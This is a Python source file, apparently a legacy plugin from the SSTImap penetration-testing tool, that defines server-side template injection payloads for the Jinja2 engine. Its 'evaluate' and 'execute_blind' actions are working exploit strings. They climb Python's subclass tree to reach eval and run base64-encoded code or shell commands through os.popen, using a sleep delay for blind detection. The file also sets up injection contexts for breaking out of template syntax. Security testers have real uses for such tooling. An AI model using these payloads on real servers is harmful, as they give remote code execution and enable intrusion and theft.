from plugins.languages import python
from utils import rand


class Jinja2_old(python.Python):
    legacy_plugin = True
    priority = 7
    plugin_info = {
        "Description": """Old long payloads for Jinja template engine""",
        "Usage notes": "Functionality completely covered by the new 'Jinja2' plugin.",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Jeremy Bae @opt9 https://github.com/opt9",  # Contributions to the Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Homepage: https://jinja.palletsprojects.com/en/stable/",
            "Github: https://github.com/pallets/jinja",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                'test_render': f'{{{{({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e}}}}',
                'test_render_expected': f'{(rand.randints[0],rand.randints[1]*rand.randints[2])}'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """{{% set d = "eval(__import__('base64').urlsafe_b64decode('{code_b64}'))" %}}{{% for c in [].__class__.__base__.__subclasses__() %}} {{% if c.__name__ == 'catch_warnings' %}}
{{% for b in c.__init__.__globals__.values() %}} {{% if b.__class__ == {{}}.__class__ %}}
{{% if 'eval' in b.keys() %}}
{{{{ b['eval'](d) }}}}
{{% endif %}} {{% endif %}} {{% endfor %}}
{{% endif %}} {{% endfor %}}"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{% set d = "__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()" %}}{{% for c in [].__class__.__base__.__subclasses__() %}} {{% if c.__name__ == 'catch_warnings' %}}
{{% for b in c.__init__.__globals__.values() %}} {{% if b.__class__ == {{}}.__class__ %}}
{{% if 'eval' in b.keys() %}}
{{{{ b['eval'](d) }}}}
{{% endif %}} {{% endif %}} {{% endfor %}}
{{% endif %}} {{% endfor %}}"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # This covers {{%s}}
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '', 'closures': python.ctx_closures},
            # This covers {% %s %}
            {'level': 1, 'prefix': '{closure}%}}', 'suffix': '', 'closures': python.ctx_closures},
            # If and for blocks
            # # if %s:\n# endif
            # # for a in %s:\n# endfor
            {'level': 5, 'prefix': '{closure}\n', 'suffix': '\n', 'closures': python.ctx_closures},
            # Comment blocks
            {'level': 5, 'prefix': '#}}', 'suffix': '{#'},

        ])
